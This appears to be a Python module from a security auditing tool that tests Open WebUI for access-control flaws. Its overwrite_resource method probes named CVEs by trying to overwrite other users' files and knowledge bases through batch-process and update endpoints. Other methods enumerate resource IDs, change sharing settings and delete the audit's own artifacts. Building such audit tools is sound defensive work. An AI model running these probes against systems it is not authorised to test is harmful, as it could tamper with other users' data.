"""
Open WebUI Lifecycle Mixin.
Handles sharing, revocation, cross-user mutations, resource enumeration, and teardown.
"""

from __future__ import annotations

import logging
from typing import Dict, Any, List, Optional

from adapters.base import UserSession

logger = logging.getLogger("firedamp.adapters.openwebui.lifecycle")


class OpenWebUILifecycleMixin:
    """Resource sharing, ACL revocation, write mutations, enumeration, and cleanup."""

    def overwrite_resource(
        self,
        base_url: str,
        session: UserSession,
        resource_ref: str,
        payload: str,
    ) -> Dict[str, Any]:
        """
        Attempts to overwrite or mutate another user's file or knowledge resource.
        Probes for CVE-2026-28788 via process_files_batch or direct update routes.
        """
        base = base_url.rstrip("/")

        # 1. Probe batch file processing overwrite (CVE-2026-28788)
        batch_payload = {
            "files": [
                {
                    "id": resource_ref,
                    "content": payload,
                    "filename": f"overwrite_{resource_ref}.md",
                }
            ],
            "file_id": resource_ref,
            "content": payload,
        }
        res = self._json_request(
            f"{base}/api/v1/files/batch/process",
            method="POST",
            data=batch_payload,
            headers=session.headers,
        )

        # 2. Fall back to direct knowledge base update probe
        if "error" in res or res.get("code") in (404, 405):
            res = self._json_request(
                f"{base}/api/v1/knowledge/{resource_ref}/update",
                method="POST",
                data={"description": payload},
                headers=session.headers,
            )

        return res

    def enumerate_resources(
        self,
        base_url: str,
        session: UserSession,
    ) -> List[str]:
        """
        Lists all file and knowledge IDs returned by the target platform to this session.
        Probes for CVE-2026-44557, CVE-2026-54016, and CVE-2026-45301.
        """
        base = base_url.rstrip("/")
        discovered_ids: List[str] = []

        # 1. Enumerate files API
        files_res = self._json_request(
            f"{base}/api/v1/files/",
            method="GET",
            headers=session.headers,
        )
        if isinstance(files_res, list):
            for item in files_res:
                if isinstance(item, dict) and "id" in item:
                    discovered_ids.append(str(item["id"]))
        elif isinstance(files_res, dict) and "data" in files_res:
            for item in files_res.get("data", []):
                if isinstance(item, dict) and "id" in item:
                    discovered_ids.append(str(item["id"]))

        # 2. Enumerate knowledge bases
        kb_res = self._json_request(
            f"{base}/api/v1/knowledge/",
            method="GET",
            headers=session.headers,
        )
        if isinstance(kb_res, list):
            for item in kb_res:
                if isinstance(item, dict) and "id" in item:
                    discovered_ids.append(str(item["id"]))
        elif isinstance(kb_res, dict) and "data" in kb_res:
            for item in kb_res.get("data", []):
                if isinstance(item, dict) and "id" in item:
                    discovered_ids.append(str(item["id"]))

        return discovered_ids

    def share_resource(
        self,
        base_url: str,
        owner: UserSession,
        resource_ref: str,
        grantee: UserSession,
    ) -> Dict[str, Any]:
        """Grants access to a knowledge collection for the grantee session."""
        base = base_url.rstrip("/")
        grantee_id = grantee.metadata.get("email", grantee.username)

        # Update access_control list for knowledge base
        return self._json_request(
            f"{base}/api/v1/knowledge/{resource_ref}/update",
            method="POST",
            data={
                "access_control": {
                    "read": {"user_ids": [grantee_id], "group_ids": []},
                    "write": {"user_ids": [], "group_ids": []},
                }
            },
            headers=owner.headers,
        )

    def revoke_resource(
        self,
        base_url: str,
        owner: UserSession,
        resource_ref: str,
        grantee: UserSession,
    ) -> Dict[str, Any]:
        """Revokes all access grants from the grantee on the target resource."""
        base = base_url.rstrip("/")
        return self._json_request(
            f"{base}/api/v1/knowledge/{resource_ref}/update",
            method="POST",
            data={"access_control": None},
            headers=owner.headers,
        )

    def cleanup(self, base_url: str, session: UserSession) -> None:
        """Delete all files, knowledge collections, and chats created during the audit."""
        base = base_url.rstrip("/")

        for kb_id in session.metadata.get("knowledge_ids", []):
            self._json_request(
                f"{base}/api/v1/knowledge/{kb_id}/delete",
                method="DELETE",
                headers=session.headers,
            )
            logger.info(f"Deleted knowledge collection {kb_id}")

        for file_id in session.metadata.get("file_ids", []):
            self._json_request(
                f"{base}/api/v1/files/{file_id}",
                method="DELETE",
                headers=session.headers,
            )
            logger.info(f"Deleted file {file_id}")

        logger.info(f"Cleanup complete for {session.username}")

